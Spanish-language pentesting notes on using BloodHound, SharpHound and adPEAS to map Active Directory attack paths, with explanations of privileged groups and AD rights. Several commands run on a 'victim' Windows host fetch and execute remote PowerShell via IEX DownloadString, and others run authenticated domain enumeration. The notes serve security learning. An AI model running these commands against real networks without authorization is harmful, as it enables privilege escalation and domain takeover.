# Bloodhound 

Tags: #AD #BloodHound #SharpHound 

**BloodHound** es una herramienta especializada en analizar y mapear relaciones dentro de Active Directory (AD). Su capacidad para identificar rutas de ataque y relaciones complejas la ha convertido en una herramienta esencial tanto para pentesters como para atacantes. A través de la recopilación y visualización de datos, permite descubrir configuraciones inseguras, privilegios excesivos y posibles vectores de escalación de privilegios o movimiento lateral en entornos AD, lo que la hace invaluable en auditorías de seguridad y pruebas de penetración.

```bash 
1. Visualización de Relaciones: BloodHound utiliza gráficos para mostrar las relaciones entre usuarios, grupos, computadoras y otros componentes en un AD. Estas visualizaciones hacen que sea más fácil para un atacante o pentester entender rápidamente las relaciones complejas y encontrar potenciales caminos de ataque.
    
2. Identificación de Caminos de Ataque: Uno de los principales valores de BloodHound es su capacidad para identificar caminos de escalada de privilegios y movimiento lateral. Al alimentar a BloodHound con datos recopilados, la herramienta puede identificar caminos específicos que un atacante puede seguir para escalar privilegios o moverse lateralmente a través de una red.
    
3. Automatización: La recopilación manual de detalles sobre las relaciones AD puede ser extremadamente lenta y tediosa. BloodHound, junto con su componente de recopilación de datos llamado SharpHound, automatiza gran parte de este proceso, permitiendo a los pentesters recopilar y analizar datos rápidamente.
    
4. Identificación de Vulnerabilidades Comunes: BloodHound también puede identificar patrones comunes que a menudo son vulnerables a la explotación, como configuraciones de delegación inseguras, miembros excesivamente permisivos en grupos de alto privilegio, y usuarios que tienen derechos de sesión local en sistemas críticos.
    
5. Capacidades de Análisis Avanzado: Aparte de identificar caminos obvios, BloodHound puede ayudar a identificar relaciones no evidentes que podrían ser explotadas. Por ejemplo, un usuario podría no tener privilegios directos sobre un recurso, pero a través de una serie de relaciones y delegaciones, podría tener una ruta de acceso indirecto.
    
6. Capacitación y Conciencia: Para defensores y equipos de seguridad, BloodHound también puede ser una herramienta valiosa. Al visualizar la estructura de permisos y las relaciones dentro de AD, los defensores pueden anticiparse a potenciales vías de ataque y tomar medidas para mitigar los riesgos.
```

## Grupos predeterminados de Active Directory:

```bash 
1. 'Domain Admins': Este grupo tiene control total sobre todos los dominios en el bosque. Cualquier usuario que sea miembro de este grupo puede realizar cualquier cambio en el dominio, como crear o eliminar otros usuarios, grupos y modificar políticas de seguridad.
2. 'Enterprise Admins': Los miembros de este grupo tienen permisos para realizar cambios a nivel de toda la empresa, incluidos todos los dominios y bosques.
3. 'Schema Admins': Los usuarios en este grupo pueden hacer cambios en el esquema de AD, que es la definición de objetos y atributos que pueden ser creados y almacenados en AD.
4. 'Account Operators': Pueden administrar las cuentas de usuario y grupos dentro de un dominio, pero no pueden modificar los miembros de los grupos de administradores ni cambiar la configuración de los servidores de dominio. Por lo que puedes crear, modificar cuentas de usuario.
5. 'Exchange Windows Permissions': Puede otorgar los permisos necesarios para que Exchange pueda interactuar con objetos de Active Directory, como usuarios, buzones y grupos. Los miembros de este grupo tienen permisos especiales en contenedores específicos de AD para realizar tareas como crear, modificar y administrar objetos relacionados con Exchange. 
6. 'Backup Operators': Pueden realizar copias de seguridad y restaurar archivos en un servidor, independientemente de los permisos de acceso a esos archivos.
7. 'Server Operators': Pueden realizar tareas de mantenimiento en servidores de dominio.
8. 'Guests': Es un grupo que por defecto tiene privilegios mínimos, y generalmente se utiliza para proporcionar acceso temporal o limitado a la red.
9. 'DNS Admins': Es un grupo especial que tiene privilegios administrativos sobre el servicio DNS del dominio.
10. 'Domain Users': Este grupo incluye todas las cuentas de usuario en un dominio. A menudo se verifica para identificar posibles cuentas huérfanas o no utilizadas.
11. 'Domain Computers': Este grupo incluye todas las estaciones de trabajo y servidores unidos al dominio.
12. 'Domain Controllers': Este grupo incluye todos los controladores de dominio en un dominio. Es esencial garantizar que sólo las máquinas confiables sean parte de este grupo.
13. 'Read-Only Domain Controllers - RODC': Si la organización utiliza RODCs, es esencial garantizar que estén configurados correctamente.
```

## Tipos de ActiveDirectoryRights

```bash 
Los 'ActiveDirectoryRights' incluyen, pero no se limitan a:

1. Read/Write: Leer y escribir información en objetos de AD.
2. Delete: Derechos para eliminar objetos.
3. CreateChild/DeleteChild: Crear o eliminar objetos hijos en un contenedor.
4. Self: Derechos para modificar información propia.
5. GenericAll: Control total sobre el objeto, incluyendo todos los derechos anteriores.
6. WriteDacl: Modificar la lista de control de acceso discrecional (DACL).  
7. WriteOwner: Cambiar el propietario de un objeto.
```

## SharpHound 

* [SharpHound](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.ps1)
* [SharpHound](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)

```powershell
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1'); 
❯ Invoke-BloodHound -CollectionMethod All     

Nota: Estos comandos los ejecutamos en la maquina victima Windows para recolectar la información y obtener un archivo '.zip' el cual pasaremos a la herramienta de 'BloodHound' para el analisis 
```

## ADPeas 

* [ADPeas](https://github.com/61106960/adPEAS)

```powershell 
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')

❯ Invoke-adPEAS    # Módulo para hacer la enumeración automatizada

Nota: Podemos usar ADPeas para hacer la recolección ya que automaticamente ejecuta 'SharpHound'
```

## SharpHound con credenciales Validas desde un CMD en Windows 

```bash 
# Autenticarse en un 'CMD' en Windows con credenciales validas
❯ runas /netonly /user:domain1.com\username cmd    # Autenticarse con credenciales validas a nivel de red en una CMD en Windows> Este comando abrirá una nueva CMD con las credenciales 

❯ dir \\IP\DIR           # Enumerar el directorio con el usuario autenticado desde una CMD en Windows 

❯ .\SharpHound.exe -c all -d domain1.com --domaincontroller IP   # Enumeración con SharpHound a un dominio con credenciales validas desde una CMD en Windows.
Nota: La herramienta regresará un archivo '.zip' que se debe cargar en 'BloodHound' para analizar

❯ python3 -m http.server 80     # Crear un recurso compartido a nivel de red para pasar archivos 
```

## BloodHound 

* [BloodHound](https://github.com/SpecterOps/BloodHound-Legacy/releases)
* [CustomQueries.json - BloodHound](https://github.com/CompassSecurity/BloodHoundQueries)
* [Neo4j-installation](https://neo4j.com/docs/operations-manual/current/installation/linux/debian/)

```bash 
❯ sudo neo4j console &> /dev/null & disown      # Iniciamos el servicio en el puerto local '7474' y lo independizamos

❯ ./BloodHound --no-sandbox & disown            # Ejecutar como usuario 'root' 
❯ bloodhound &> /dev/null & disown              # Ejecutar 'Bloodhound' e independizarlo

Notas: 
	1. Si es la primera vez que se usa, abrir la web 'localhost:7474', agregar las credenciales 'neo4j:neo4j', despues, colocar una nueva passwd y conectarse al 'Bloodhound'
	2. El 'CustomQueries.json' se descarga y se copia en la carpeta donde esta instalado 'BloodHound'
```

```bash 
Identificar lo siguiente en BloodHound:
	1. Identificación de 'Doman Admins'
	2. Identificación de 'usuarios Kerberoasteables'
	3. Identificación de 'usuarios AS-REP Roastable'
	4. Identificación de vectores de ataque 'Find Shortest Paths to Domain Admins'
	5. Identificación de 'Unsconstrained Delegation'
	6. Identificación de usuarios con permisos sobre GPO 'Find if any domain user has interesting against aGPO'
	7. 
```

